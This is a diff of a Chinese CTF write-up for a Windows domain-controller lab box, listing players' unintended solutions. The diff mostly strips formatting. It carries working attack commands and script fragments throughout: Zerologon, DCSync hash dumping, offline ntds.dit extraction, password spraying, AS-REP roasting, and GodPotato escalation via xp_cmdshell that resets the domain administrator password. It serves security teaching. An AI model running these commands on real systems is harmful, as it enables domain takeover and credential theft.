@@ -1,8 +1,8 @@
 ---
-title: Poloras-BabyDC-Documents
+title: PolorasCTF-BabyDC-Documents
 description: '个人出题-作者WriteUp'
 pubDate: 2026-03-30
-image: /game/Castlevania.png
+image: /ctf/Castlevania.png
 categories:
   - Documentation
   - CTF
@@ -10,6 +10,7 @@ tags:
   - CTF
   - Windows Machine
 ---
+![](/ctf/poloarsctf.png)
 ![](/image/myself%20machine/Castlevania-Documents-1.png)
 
 # Castlevania - Description
@@ -23,16 +24,16 @@ tags:
 ---
 
 ## 🔮 城堡探秘指南
-| **<font style="color:rgb(13, 13, 13);">城堡区域</font>** | **<font style="color:rgb(13, 13, 13);">暗影线索</font>** | **<font style="color:rgb(13, 13, 13);">猎人行动</font>** |
+| **城堡区域** | **暗影线索** | **猎人行动** |
 | --- | --- | --- |
-| **<font style="color:rgb(13, 13, 13);">前庭：破碎的彩窗</font>** | <font style="color:rgb(13, 13, 13);">IIS 的古老铭文残缺不全，短名如裂纹映出真实文件的轮廓</font> | <font style="color:rgb(13, 13, 13);">循着残存的光影，找到被隐藏的卷轴</font> |
-| **<font style="color:rgb(13, 13, 13);">图书馆：尘封的藏书库</font>** | <font style="color:rgb(13, 13, 13);">MSSQL 的书架错位排列，Linked Server 的符文彼此共鸣</font> | <font style="color:rgb(13, 13, 13);">借由错误的多重咒文，踏入高阶的禁区</font> |
-| **<font style="color:rgb(13, 13, 13);">地下水脉：沉睡的地道</font>** | <font style="color:rgb(13, 13, 13);">黑暗中回荡着隐秘的回声，服务之魂在隧道中低语</font> | <font style="color:rgb(13, 13, 13);">唤醒支配之力，挖掘幽深的隧道</font> |
-| **<font style="color:rgb(13, 13, 13);">礼拜堂：幽魂的邮驿室</font>** | <font style="color:rgb(13, 13, 13);">邮箱如祭祀符文闪烁，信件承载着未被察觉的低语</font> | <font style="color:rgb(13, 13, 13);">欺瞒死神的信使，诱出被遗忘的名字与密语</font> |
-| **<font style="color:rgb(13, 13, 13);">时钟塔：失序的混沌戒指</font>** | <font style="color:rgb(13, 13, 13);">Kerberos 的齿轮开始逆转，身份与时间失去秩序</font> | <font style="color:rgb(13, 13, 13);">双重咒印崩解，开启逆城的大门</font> |
-| **<font style="color:rgb(13, 13, 13);">血色密室：禁忌的灵魂之匣</font>** | <font style="color:rgb(13, 13, 13);">Registry Hive 如封存灵魂的容器，机器的记忆在哭泣</font> | <font style="color:rgb(13, 13, 13);">窃取三份古文书，汲取魔王的暗影之力</font> |
-| **<font style="color:rgb(13, 13, 13);">王座室：不灭的护身符</font>** | <font style="color:rgb(13, 13, 13);">域控之主的权柄凝结为黄金之证，欺骗身份与历史</font> | <font style="color:rgb(13, 13, 13);">铸造并注入黄金之证，坐上血红的王座</font> |
-| **<font style="color:rgb(13, 13, 13);">终焉之间：血之圣杯</font>** | <font style="color:rgb(13, 13, 13);">Flag 是逆城的核心封印，亦是支配的终点</font> | <font style="color:rgb(13, 13, 13);">完成仪式，读取隐藏 Flag，城堡隐于月下</font> |
+| **前庭：破碎的彩窗** | IIS 的古老铭文残缺不全，短名如裂纹映出真实文件的轮廓 | 循着残存的光影，找到被隐藏的卷轴 |
+| **图书馆：尘封的藏书库** | MSSQL 的书架错位排列，Linked Server 的符文彼此共鸣 | 借由错误的多重咒文，踏入高阶的禁区 |
+| **地下水脉：沉睡的地道** | 黑暗中回荡着隐秘的回声，服务之魂在隧道中低语 | 唤醒支配之力，挖掘幽深的隧道 |
+| **礼拜堂：幽魂的邮驿室** | 邮箱如祭祀符文闪烁，信件承载着未被察觉的低语 | 欺瞒死神的信使，诱出被遗忘的名字与密语 |
+| **时钟塔：失序的混沌戒指** | Kerberos 的齿轮开始逆转，身份与时间失去秩序 | 双重咒印崩解，开启逆城的大门 |
+| **血色密室：禁忌的灵魂之匣** | Registry Hive 如封存灵魂的容器，机器的记忆在哭泣 | 窃取三份古文书，汲取魔王的暗影之力 |
+| **王座室：不灭的护身符** | 域控之主的权柄凝结为黄金之证，欺骗身份与历史 | 铸造并注入黄金之证，坐上血红的王座 |
+| **终焉之间：血之圣杯** | Flag 是逆城的核心封印，亦是支配的终点 | 完成仪式，读取隐藏 Flag，城堡隐于月下 |
 
 
 ---
@@ -646,34 +647,34 @@ FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
 > 下列四种非预期解法均取自本次比赛选手的wp中
 >
 
-## <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
-> <font style="color:rgb(79, 79, 79);">CVSS满分漏洞，被称为域内永恒之蓝</font>
+## Zerologon
+> CVSS满分漏洞，被称为域内永恒之蓝
 >
-> <font style="color:rgb(79, 79, 79);">靶机搭建环境选自互联网中windows server2019镜像.....出题的时候没往这块想</font>
+> 靶机搭建环境选自互联网中windows server2019镜像.....出题的时候没往这块想
 >
-> <font style="color:rgb(79, 79, 79);">出乎我的意料了......当看到选手的wp令我很惊讶</font>
+> 出乎我的意料了......当看到选手的wp令我很惊讶
 >
-> <font style="color:rgb(79, 79, 79);">八名选手采用该方法解出题目</font>
+> 八名选手采用该方法解出题目
 >
 
-### <font style="color:rgb(51, 51, 51);">影响系统版本</font>
-<font style="color:rgb(51, 51, 51);">Windows Server 2008 R2 for x64-based Systems Service Pack 1  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2012  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2012 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2012 R2  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2012 R2 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2016  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2016 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2019  
-</font><font style="color:rgb(51, 51, 51);">Windows Server 2019 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server, version 1903 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server, version 1909 (Server Core installation)  
-</font><font style="color:rgb(51, 51, 51);">Windows Server, version 2004 (Server Core installation)</font>
+### 影响系统版本
+Windows Server 2008 R2 for x64-based Systems Service Pack 1  
+Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)  
+Windows Server 2012  
+Windows Server 2012 (Server Core installation)  
+Windows Server 2012 R2  
+Windows Server 2012 R2 (Server Core installation)  
+Windows Server 2016  
+Windows Server 2016 (Server Core installation)  
+Windows Server 2019  
+Windows Server 2019 (Server Core installation)  
+Windows Server, version 1903 (Server Core installation)  
+Windows Server, version 1909 (Server Core installation)  
+Windows Server, version 2004 (Server Core installation)
 
-### <font style="color:rgb(51, 51, 51);">利用方法</font>
+### 利用方法
 #### 手法一：msfconsole
-##### <font style="color:rgb(51, 51, 51);">1. </font>ZeroLogon 
+##### 1. ZeroLogon 
 ```plain
 $ crackmapexec smb 192.168.40.132 -u '' -p '' -M zerologon
 
@@ -691,7 +692,7 @@ msf6> run
 
 ---
 
-##### <font style="color:rgb(51, 51, 51);">2. </font>DCSync 
+##### 2. DCSync 
 ```plain
 $ impacket-secretsdump -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' \
    -just-dc 'XMCVE.local/CASTLEVANIA$'@192.168.40.132
@@ -707,15 +708,15 @@ XMCVE.local\mowen:1105:aad3b435b51404eeaad3b435b51404ee:efb5fa49a38497a71e144f69
 ```
 
 #### 手法二：python脚本
-##### <font style="color:rgb(51, 51, 51);">1. </font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
+##### 1. Zerologon
 ![](/image/myself%20machine/Castlevania-Documents-2.jpeg)
 
-##### <font style="color:rgb(51, 51, 51);">2. </font>hash dump
-<font style="color:#333333;">利用成功，接下来dump域内所有用户的哈希</font>
+##### 2. hash dump
+利用成功，接下来dump域内所有用户的哈希
 
 ![](/image/myself%20machine/Castlevania-Documents-3.jpeg)
 
-## <font style="color:#333333;">本地挂载</font><font style="color:rgb(51, 51, 51);"></font>
+## 本地挂载
 > 当初为了预防选手将靶机当取证来做故将flag抹去，当看到wp令我意外.....
 >
 > 并且还没办法修，无论是ntds.dit还是Hive删掉都会直接影响系统运行
@@ -724,7 +725,7 @@ XMCVE.local\mowen:1105:aad3b435b51404eeaad3b435b51404ee:efb5fa49a38497a71e144f69
 >
 
 ### 方法一：挂载kali
-#### <font style="color:rgb(51, 51, 51);">1. </font>挂载硬盘并提取 NTDS 数据库
+#### 1. 挂载硬盘并提取 NTDS 数据库
 将 Windows 域控的虚拟硬盘挂载到 Kali Linux，复制 AD 数据库文件：
 
 >  `ntds.dit`：Active Directory 数据库，存储所有域用户的凭据 Hash  
@@ -736,7 +737,7 @@ sudo cp /mnt/win/Windows/NTDS/ntds.dit ~/Desktop/
 sudo cp /mnt/win/Windows/System32/config/SYSTEM ~/Desktop/
 ```
 
-#### <font style="color:rgb(51, 51, 51);">2. </font>离线提取域用户 Hash
+#### 2. 离线提取域用户 Hash
 使用 `impacket-secretsdump` 离线解密 ntds.dit：
 
 > 关键发现：Administrator 与 Alucard 共享同一个 NT Hash，多个普通用户也共享同一个 Hash，说明存在弱密码策略。
@@ -750,27 +751,27 @@ sudo impacket-secretsdump -ntds ~/Desktop/ntds.dit -system ~/Desktop/SYSTEM LOCA
 | :--- |
 
 
-### 方法二：<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OVA分解挂盘</font>
-#### <font style="color:rgb(51, 51, 51);">1. </font><font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage</font>
-<font style="color:rgb(51, 51, 51);">本地没有直接可用的官方 VirtualBox 7.2.0 图形界面环境，所以我直接用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage.exe</font>`<font style="color:rgb(51, 51, 51);"> 做手工导入和挂盘。</font>
+### 方法二：OVA分解挂盘
+#### 1. VBoxManage
+本地没有直接可用的官方 VirtualBox 7.2.0 图形界面环境，所以我直接用 `VBoxManage.exe` 做手工导入和挂盘。
 
-<font style="color:rgb(51, 51, 51);">处理方式不是直接 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage import</font>`<font style="color:rgb(51, 51, 51);">，而是：</font>
+处理方式不是直接 `VBoxManage import`，而是：
 
-1. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);"> 解出 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ovf</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained 1-disk001.vmdk</font>`
-2. <font style="color:rgb(51, 51, 51);">把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">streamOptimized</font>`<font style="color:rgb(51, 51, 51);"> 的 VMDK 转成可直接挂载的 VDI</font>
-3. <font style="color:rgb(51, 51, 51);">手工创建 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Windows2019_64</font>`<font style="color:rgb(51, 51, 51);"> 虚拟机并挂盘</font>
-4. <font style="color:rgb(51, 51, 51);">配置 NAT 端口转发</font>
+1. 从 `Bloodstained.ova` 解出 `Bloodstained.ovf` 和 `Bloodstained 1-disk001.vmdk`
+2. 把 `streamOptimized` 的 VMDK 转成可直接挂载的 VDI
+3. 手工创建 `Windows2019_64` 虚拟机并挂盘
+4. 配置 NAT 端口转发
 
-#### <font style="color:rgb(51, 51, 51);">2. </font>离线导出
-<font style="color:rgb(51, 51, 51);">离线链路，从 VMDK 里直接导出关键文件：</font>
+#### 2. 离线导出
+离线链路，从 VMDK 里直接导出关键文件：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/NTDS/ntds.dit</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SYSTEM</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SECURITY</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/inetpub/wwwroot</font>`
++ `/Windows/NTDS/ntds.dit`
++ `/Windows/System32/config/SYSTEM`
++ `/Windows/System32/config/SECURITY`
++ `/inetpub/wwwroot`
 
-#### <font style="color:rgb(51, 51, 51);">3. 域控凭据</font>
-<font style="color:rgb(51, 51, 51);">对离线导出的三件套执行：</font>
+#### 3. 域控凭据
+对离线导出的三件套执行：
 
 ```plain
 python secretsdump.py -system offline/hives/SYSTEM \
@@ -1366,12 +1367,12 @@ if __name__ == "__main__":
 > 俩名选手采用该方法解出题目
 >
 
-### <font style="color:rgb(51, 51, 51);">1. 用户枚举与口令喷洒</font>
-<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">kerbrute</font>`<font style="color:rgb(51, 51, 51);"> 跑一轮常见用户名：</font>
+### 1. 用户枚举与口令喷洒
+先用 `kerbrute` 跑一轮常见用户名：
 
 kerbrute userenum -d XMCVE.local --dc 192.168.56.105 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 
-<font style="color:rgb(51, 51, 51);">命中的有效用户包括：</font>
+命中的有效用户包括：
 
 ```plain
 admin
@@ -1382,11 +1383,11 @@ Admin
 alucard
 ```
 
-<font style="color:rgb(51, 51, 51);">接着做一轮最常见弱口令喷洒：</font>
+接着做一轮最常见弱口令喷洒：
 
 kerbrute passwordspray -d XMCVE.local --dc 192.168.56.105 valid_users.txt 'Password123!'
 
-<font style="color:rgb(51, 51, 51);">命中结果：</font>
+命中结果：
 
 ```plain
 admin:Password123!
@@ -1395,16 +1396,16 @@ support:Password123!
 Admin:Password123!
 ```
 
-<font style="color:rgb(51, 51, 51);">这一步只拿到了普通域账号，没有直接管理权限。</font>
+这一步只拿到了普通域账号，没有直接管理权限。
 
-### <font style="color:rgb(51, 51, 51);">2. BloodHound 找真正突破口</font>
-<font style="color:rgb(51, 51, 51);">用已知凭据采集 BloodHound 数据：</font>
+### 2. BloodHound 找真正突破口
+用已知凭据采集 BloodHound 数据：
 
-<font style="color:rgb(51, 51, 51);">bloodhound-python -u admin -p 'Password123!' -d XMCVE.local -dc CASTLEVANIA.XMCVE.local -ns 192.168.56.105 -c All --zip</font>
+bloodhound-python -u admin -p 'Password123!' -d XMCVE.local -dc CASTLEVANIA.XMCVE.local -ns 192.168.56.105 -c All --zip
 
-<font style="color:rgb(51, 51, 51);">在采集结果里，关键用户是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">MOWEN@XMCVE.LOCAL</font>`<font style="color:rgb(51, 51, 51);">。</font>
+在采集结果里，关键用户是 `MOWEN@XMCVE.LOCAL`。
 
-<font style="color:rgb(51, 51, 51);">已验证到的关键属性：</font>
+已验证到的关键属性：
 
 ```plain
 dontreqpreauth: true
@@ -1412,50 +1413,50 @@ serviceprincipalnames: HTTP/CASTLEVANIA.XMCVE.local
 member of: BACKUP OPERATORS
 ```
 
-<font style="color:rgb(51, 51, 51);">同时还能看到：</font>
+同时还能看到：
 
-<font style="color:rgb(51, 51, 51);">ALUCARD@XMCVE.LOCAL -> member of local Administrators</font>
+ALUCARD@XMCVE.LOCAL -> member of local Administrators
 
-<font style="color:rgb(51, 51, 51);">但 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">alucard</font>`<font style="color:rgb(51, 51, 51);"> 当前没有口令，暂时走不通。</font>
+但 `alucard` 当前没有口令，暂时走不通。
 
-<font style="color:rgb(51, 51, 51);">因此最优路径变成：</font>
+因此最优路径变成：
 
-+ <font style="color:rgb(51, 51, 51);">先打 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的 AS-REP Roast</font>
-+ <font style="color:rgb(51, 51, 51);">再利用其 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 权限打域控</font>
++ 先打 `mowen` 的 AS-REP Roast
++ 再利用其 `Backup Operators` 权限打域控
 
 ---
 
-### <font style="color:rgb(51, 51, 51);">3. AS-REP Roast 拿下 mowen</font>
-<font style="color:rgb(51, 51, 51);">因为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启了“不需要预认证”，可以直接请求 AS-REP：</font>
+### 3. AS-REP Roast 拿下 mowen
+因为 `mowen` 开启了“不需要预认证”，可以直接请求 AS-REP：
 
-<font style="color:rgb(51, 51, 51);">impacket-GetNPUsers XMCVE.local/mowen -dc-ip 192.168.56.105 -no-pass -request</font>
+impacket-GetNPUsers XMCVE.local/mowen -dc-ip 192.168.56.105 -no-pass -request
 
-<font style="color:rgb(51, 51, 51);">拿到哈希后用 John 爆破：</font>
+拿到哈希后用 John 爆破：
 
 ```plain
 john mowen.asrep --wordlist=/usr/share/wordlists/rockyou.txt
 john --show mowen.asrep
 ```
 
-<font style="color:rgb(51, 51, 51);">爆破结果：</font>
+爆破结果：
 
-<font style="color:rgb(51, 51, 51);">mowen:1maxwell</font>
+mowen:1maxwell
 
-<font style="color:rgb(51, 51, 51);">至此得到可用凭据：</font>
+至此得到可用凭据：
 
-<font style="color:rgb(51, 51, 51);">XMCVE.local\mowen : 1maxwell</font>
+XMCVE.local\mowen : 1maxwell
 
-## <font style="color:rgb(51, 51, 51);">土豆提权</font>
+## 土豆提权
 > 通过Mssql的账户权限-SeImpersonatePrivilege进行土豆提权
 >
 > 三名选手采用该方法解出题目
 >
 
 ### 手法一
-#### <font style="color:rgb(51, 51, 51);">1. SQL 利用</font>
-<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">通过wuwupor / lovlyBaby登录mssql</font>
+#### 1. SQL 利用
+通过wuwupor / lovlyBaby登录mssql
 
-<font style="color:rgb(51, 51, 51);">确认配置项时还能看到 linked server的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 已经开启：</font>
+确认配置项时还能看到 linked server的`xp_cmdshell` 已经开启：
 
 ```plain
 SELECT name, CAST(value_in_use AS int) AS value_in_use
@@ -1463,53 +1464,53 @@ FROM sys.configurations
 WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'Ad Hoc Distributed Queries', 'clr enabled', 'remote access');
 ```
 
-<font style="color:rgb(51, 51, 51);">于是可以直接通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 执行系统命令：</font>
+于是可以直接通过 `POO_PUBLIC` 执行系统命令：
 
 EXEC ('EXEC xp_cmdshell ''whoami''') AT POO_PUBLIC;
 
-<font style="color:rgb(51, 51, 51);">返回身份是：</font>
+返回身份是：
 
 xmcve\sqlsvc
 
-<font style="color:rgb(51, 51, 51);">接着看权限：</font>
+接着看权限：
 
 EXEC ('EXEC xp_cmdshell ''whoami /priv''') AT POO_PUBLIC;
 
-<font style="color:rgb(51, 51, 51);">输出里最关键的一项是：</font>
+输出里最关键的一项是：
 
 SeImpersonatePrivilege    Enabled
 
-<font style="color:rgb(51, 51, 51);">这说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 已经满足典型的本地提权条件，只差一条能把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);"> 用起来的链。这里直接使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);">，它对 Windows Server 2019 可用。</font>
+这说明 `sqlsvc` 已经满足典型的本地提权条件，只差一条能把 `SeImpersonatePrivilege` 用起来的链。这里直接使用 `GodPotato`，它对 Windows Server 2019 可用。
 
-#### <font style="color:rgb(51, 51, 51);">2. 系统提权</font>
-<font style="color:rgb(51, 51, 51);">利用思路非常直接：</font>
+#### 2. 系统提权
+利用思路非常直接：
 
-1. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 下发 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`
-2. <font style="color:rgb(51, 51, 51);">让 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 身份执行一条命令</font>
-3. <font style="color:rgb(51, 51, 51);">把已知明文口令的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 加进 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Domain Admins</font>`
-4. <font style="color:rgb(51, 51, 51);">重新用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 发起网络登录，直接拿管理员级远程会话</font>
+1. 用 `xp_cmdshell` 下发 `GodPotato.exe`
+2. 让 `GodPotato` 以 `SYSTEM` 身份执行一条命令
+3. 把已知明文口令的 `sqlsvc / Sql!2026` 加进 `Domain Admins`
+4. 重新用 `sqlsvc / Sql!2026` 发起网络登录，直接拿管理员级远程会话
 
-`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami</font>`<font style="color:rgb(51, 51, 51);"> 验证时，返回结果里已经能看到：</font>
+`GodPotato` 先用 `whoami` 验证时，返回结果里已经能看到：
 
 CurrentUser: NT AUTHORITY\SYSTEM
 
-<font style="color:rgb(51, 51, 51);">然后执行：</font>
+然后执行：
 
 ```plain
 net group "Domain Admins" sqlsvc /add /domain
 ```
 
-<font style="color:rgb(51, 51, 51);">命令成功后，重新使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 进行远程执行，就能拿到管理员级 shell。这里用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 验证，返回结果是：</font>
+命令成功后，重新使用 `sqlsvc / Sql!2026` 进行远程执行，就能拿到管理员级 shell。这里用 `psexec` 验证，返回结果是：
 
 ```plain
 nt authority\system
 CASTLEVANIA
 ```
 
-<font style="color:rgb(51, 51, 51);">成功拿到admin shell</font>
+成功拿到admin shell
 
-#### <font style="color:rgb(51, 51, 51);">3.Exp</font>
-<font style="color:rgb(51, 51, 51);">下面给出完整利用脚本。脚本会先连 SQL，确认 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 可用，然后临时开启一个本地 HTTP 服务，把同目录中的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`<font style="color:rgb(51, 51, 51);"> 下发到目标，执行提权，再自动调用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 拉起管理员 shell。</font>
+#### 3.Exp
+下面给出完整利用脚本。脚本会先连 SQL，确认 `POO_PUBLIC` 可用，然后临时开启一个本地 HTTP 服务，把同目录中的 `GodPotato.exe` 下发到目标，执行提权，再自动调用 `psexec` 拉起管理员 shell。
 
 ```plain
 import argparse
@@ -1685,14 +1686,14 @@ if __name__ == "__main__":
 ```
 
 ### 手法二
-#### <font style="color:rgb(51, 51, 51);">GodPotato</font>
-<font style="color:rgb(51, 51, 51);">由于系统是 Windows Server 2019，且 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);">，直接换成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 即可。</font>
+#### GodPotato
+由于系统是 Windows Server 2019，且 `sqlsvc` 拥有 `SeImpersonatePrivilege`，直接换成 `GodPotato` 即可。
 
-<font style="color:rgb(51, 51, 51);">我在宿主机开了一个临时 HTTP 服务，把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato-NET4.exe</font>`<font style="color:rgb(51, 51, 51);"> 投到客机，然后通过 SQL 执行：</font>
+我在宿主机开了一个临时 HTTP 服务，把 `GodPotato-NET4.exe` 投到客机，然后通过 SQL 执行：
 
 C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Xmctf2026Aa /domain"
 
-`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 的关键回显如下：</font>
+`GodPotato` 的关键回显如下：
 
 ```plain
 [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
@@ -1704,56 +1705,56 @@ C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Xmctf2026
 The command completed successfully.
 ```
 
-<font style="color:rgb(51, 51, 51);">这说明链条已经把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 抬到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">，并成功执行了我们给它的命令。</font>
+这说明链条已经把 `sqlsvc` 抬到了 `SYSTEM`，并成功执行了我们给它的命令。
 
-<font style="color:rgb(51, 51, 51);">随后再查：</font>
+随后再查：
 
 net user Administrator /domain
 
-<font style="color:rgb(51, 51, 51);">可以看到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Password last set</font>`<font style="color:rgb(51, 51, 51);"> 已经更新，说明域管理员密码确实被改掉了。</font>
+可以看到 `Password last set` 已经更新，说明域管理员密码确实被改掉了。
 
-#### <font style="color:rgb(51, 51, 51);">验证 Administrator shell</font>
-<font style="color:rgb(51, 51, 51);">最后直接用新密码通过 impacket 的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wmiexec.py</font>`<font style="color:rgb(51, 51, 51);"> 验证远程管理员执行：</font>
+#### 验证 Administrator shell
+最后直接用新密码通过 impacket 的 `wmiexec.py` 验证远程管理员执行：
 
 ```plain
 python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 whoami
 python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 hostname
 ```
 
-<font style="color:rgb(51, 51, 51);">回显：</font>
+回显：
 
 ```plain
 xmcve\administrator
 CASTLEVANIA
 ```
 
-<font style="color:rgb(51, 51, 51);">这一步已经满足题目要求的：</font>
+这一步已经满足题目要求的：
 
 拿到 Administrator shell
 
-#### <font style="color:rgb(51, 51, 51);">补充：本地 flag 文本的恢复</font>
-<font style="color:rgb(51, 51, 51);">虽然官方 flag 要人工审核后发放，但镜像里其实残留了一个已经删除的本地 flag 文件线索。</font>
+#### 补充：本地 flag 文本的恢复
+虽然官方 flag 要人工审核后发放，但镜像里其实残留了一个已经删除的本地 flag 文件线索。
 
-<font style="color:rgb(51, 51, 51);">在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Alucard</font>`<font style="color:rgb(51, 51, 51);"> 的 Recent 里有一个快捷方式：</font>
+在 `Alucard` 的 Recent 里有一个快捷方式：
 
 C:\Users\Alucard\Recent\flag.lnk
 
-<font style="color:rgb(51, 51, 51);">它指向：</font>
+它指向：
 
 C:\Users\Administrator\Desktop\flag.txt
 
-<font style="color:rgb(51, 51, 51);">这个文件本身已经被删掉了，但在回收站目录中仍然留有内容文件：</font>
+这个文件本身已经被删掉了，但在回收站目录中仍然留有内容文件：
 
 $Recycle.Bin\S-1-5-21-...-500\$RIZ9PVX.txt
 
-<font style="color:rgb(51, 51, 51);">离线读这个文件，能恢复出：</font>
+离线读这个文件，能恢复出：
 
 FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
 
-<font style="color:rgb(51, 51, 51);">再次强调，这更像是镜像内的本地证明文本，不一定等于比赛平台最后发放的正式 flag。</font>
+再次强调，这更像是镜像内的本地证明文本，不一定等于比赛平台最后发放的正式 flag。
 
-#### <font style="color:rgb(51, 51, 51);">Exploit</font>
-<font style="color:rgb(51, 51, 51);">完整利用脚本放在：</font>
+#### Exploit
+完整利用脚本放在：
 
 ```plain
 from __future__ import annotations
@@ -1872,14 +1873,14 @@ if __name__ == "__main__":
     raise SystemExit(main())
 ```
 
-<font style="color:rgb(51, 51, 51);">脚本做的事情是：</font>
+脚本做的事情是：
 
-1. <font style="color:rgb(51, 51, 51);">在宿主机开启临时 HTTP 服务。</font>
